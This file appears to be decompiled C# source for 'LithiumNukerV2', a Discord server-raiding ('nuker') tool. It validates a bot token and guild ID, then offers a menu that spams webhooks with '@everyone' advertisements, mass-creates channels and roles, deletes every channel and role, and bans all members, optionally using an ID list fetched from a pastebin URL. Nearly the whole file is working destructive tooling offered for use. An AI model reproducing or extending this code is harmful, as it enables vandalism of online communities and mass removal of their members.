using System;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;
using LithiumCore;
using Veylib.CLIUI;

namespace LithiumNukerV2
{
	// Token: 0x02000003 RID: 3
	internal class Picker
	{
		// Token: 0x06000003 RID: 3 RVA: 0x00002098 File Offset: 0x00000298
		private static void opts()
		{
			AsciiTable asciiTable = new AsciiTable(new AsciiTable.Properties
			{
				Colors = new AsciiTable.ColorProperties
				{
					RainbowDividers = true
				}
			});
			asciiTable.AddColumn(string.Format("Version - {0}", LithiumShared.GetVersion(null)));
			asciiTable.AddColumn(string.Format("Core version - {0}", LithiumShared.GetVersion(typeof(Bot).Assembly)));
			AsciiTable asciiTable2 = new AsciiTable(new AsciiTable.Properties
			{
				Colors = new AsciiTable.ColorProperties
				{
					RainbowDividers = true
				}
			});
			asciiTable2.AddColumn("1 - Webhook spam channels");
			asciiTable2.AddColumn("2 - Create channels");
			asciiTable2.AddColumn("3 - Delete channels");
			asciiTable2.AddRow(new string[]
			{
				"4 - Create roles",
				"5 - Delete roles",
				"6 - Ban members"
			});
			Picker.core.Clear();
			asciiTable.WriteTable();
			asciiTable2.WriteTable();
			int num;
			if (!int.TryParse(Picker.core.ReadLine("Choice : "), out num))
			{
				Picker.core.WriteLine(new object[]
				{
					"Invalid choice"
				});
				Picker.core.Delay(2500);
				Picker.opts();
				return;
			}
			switch (num)
			{
			case 1:
				Picker.whSpam();
				return;
			case 2:
				Picker.createChans();
				return;
			case 3:
				new Thread(delegate()
				{
					Picker.channels.Nuke();
				}).Start();
				return;
			case 4:
				Picker.createRoles();
				return;
			case 5:
				new Thread(delegate()
				{
					Picker.roles.Nuke();
				}).Start();
				return;
			case 6:
				Picker.banAll();
				return;
			default:
				Picker.core.WriteLine(new object[]
				{
					"Invalid choice"
				});
				Picker.core.Delay(1000);
				Picker.opts();
				return;
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002274 File Offset: 0x00000474
		public static void Choose()
		{
			string text;
			for (;;)
			{
				Picker.core.Clear();
				Regex regex = new Regex("[\\w-]{24}.[\\w-]{6}.[\\w-]{27}");
				text = Settings.Token;
				if (text == null)
				{
					text = Picker.core.ReadLine("Bot token : ");
				}
				if (regex.Match(text).Length == 0)
				{
					Picker.core.WriteLine(new object[]
					{
						Color.Red,
						"Input does not conform to token format."
					});
					Picker.core.Delay(2500);
				}
				else
				{
					if (Picker.bot.TestToken(text))
					{
						break;
					}
					Picker.core.WriteLine(new object[]
					{
						Color.Red,
						"Invalid bot token."
					});
					Picker.core.Delay(2500);
				}
			}
			Settings.Token = text;
			bool flag = Settings.GuildId != null;
			long value;
			for (;;)
			{
				Picker.core.Clear();
				if (!flag)
				{
					flag = long.TryParse(Picker.core.ReadLine("Guild ID : "), out value);
				}
				else
				{
					value = Settings.GuildId.Value;
				}
				if (!flag)
				{
					Picker.core.WriteLine(new object[]
					{
						Color.Red,
						"Guild ID couldn't be parsed."
					});
					Picker.core.Delay(2500);
				}
				else
				{
					if (Picker.bot.IsInGuild(Settings.Token, value))
					{
						break;
					}
					Picker.core.WriteLine(new object[]
					{
						Color.Red,
						"Bot is not in guild."
					});
					Picker.core.Delay(2500);
				}
			}
			Settings.GuildId = new long?(value);
			Picker.channels = new Channels(Settings.Token, Settings.GuildId.Value, Settings.Threads);
			Picker.webhooks = new Webhooks(Settings.Token, Settings.GuildId.Value, Settings.Threads);
			Picker.users = new Users(Settings.Token, Settings.GuildId.Value, Settings.Threads);
			Picker.roles = new Roles(Settings.Token, Settings.GuildId.Value, Settings.Threads);
			Channels.Finished += delegate()
			{
				Picker.core.Delay(1000);
				Picker.opts();
			};
			Webhooks.Finished += delegate()
			{
				Picker.core.Delay(1000);
				Picker.opts();
			};
			Users.Finished += delegate()
			{
				Picker.core.Delay(1000);
				Picker.opts();
			};
			Roles.Finished += delegate()
			{
				Picker.core.Delay(1000);
				Picker.opts();
			};
			Picker.opts();
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002518 File Offset: 0x00000718
		private static void whSpam()
		{
			string content = Picker.core.ReadLine("Content : ");
			int amnt;
			if (!int.TryParse(Picker.core.ReadLine("Amount of messages per webhook : "), out amnt))
			{
				Picker.core.WriteLine(new object[]
				{
					Color.Red,
					"Failed to parse amount of messages to an int"
				});
				Picker.core.Delay(5000);
				Picker.opts();
				return;
			}
			string text = Picker.core.ReadLine("Reuse existing webhooks (causes long delay) : [y/N] ");
			bool scan = true;
			if (text == "" || text.ToLower() == "n")
			{
				scan = false;
			}
			if (content == "")
			{
				content = "@everyone discord.gg/lith";
			}
			new Thread(delegate()
			{
				Picker.webhooks.Spam(Settings.WebhookName, Settings.AvatarUrl, content, amnt, scan);
			}).Start();
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002608 File Offset: 0x00000808
		private static void createChans()
		{
			string name = Picker.core.ReadLine("Channel name : ");
			string type = Picker.core.ReadLine("Type : [text, voice] ");
			int amnt;
			if (!int.TryParse(Picker.core.ReadLine("Amount : "), out amnt))
			{
				Picker.core.WriteLine(new object[]
				{
					Color.Red,
					"Failed to parse amount to an int"
				});
				Picker.core.Delay(5000);
				Picker.opts();
				return;
			}
			if (type == "")
			{
				type = "text";
			}
			if (type.ToLower() != "text" && type.ToLower() != "voice")
			{
				Picker.core.WriteLine(new object[]
				{
					Color.Red,
					"Invalid channel type"
				});
				Picker.core.Delay(5000);
				Picker.opts();
				return;
			}
			type = type.Substring(0, 1).ToUpper() + type.Substring(1).ToLower();
			if (name == "")
			{
				name = "ran by lithium";
			}
			new Thread(delegate()
			{
				Picker.channels.Spam(name, (Channels.Type)Enum.Parse(typeof(Channels.Type), type), amnt);
			}).Start();
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002784 File Offset: 0x00000984
		private static void createRoles()
		{
			string name = Picker.core.ReadLine("Role name : ");
			int amnt;
			if (!int.TryParse(Picker.core.ReadLine("Amount : "), out amnt))
			{
				Picker.core.WriteLine(new object[]
				{
					Color.Red,
					"Failed to parse amount to an int"
				});
				return;
			}
			new Thread(delegate()
			{
				Picker.roles.Spam(name, amnt, ColorTranslator.FromHtml("#6B00FF"));
			}).Start();
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002804 File Offset: 0x00000A04
		private static void banAll()
		{
			string text = Picker.core.ReadLine("Ban IDs : [y/N] ");
			bool banIds;
			if (text == "" || text.ToLower() == "n")
			{
				banIds = false;
			}
			else
			{
				banIds = true;
			}
			if (banIds && !File.Exists("ids.txt"))
			{
				new WebClient().DownloadFile("https://pastebin.com/raw/3NPBvgK5", "ids.txt");
			}
			new Thread(delegate()
			{
				Picker.users.BanAll(banIds);
			}).Start();
		}

		// Token: 0x04000009 RID: 9
		public static Core core = Core.GetInstance();

		// Token: 0x0400000A RID: 10
		private static Channels channels;

		// Token: 0x0400000B RID: 11
		private static Webhooks webhooks;

		// Token: 0x0400000C RID: 12
		private static Users users;

		// Token: 0x0400000D RID: 13
		private static Roles roles;

		// Token: 0x0400000E RID: 14
		private static Bot bot = new Bot();
	}
}
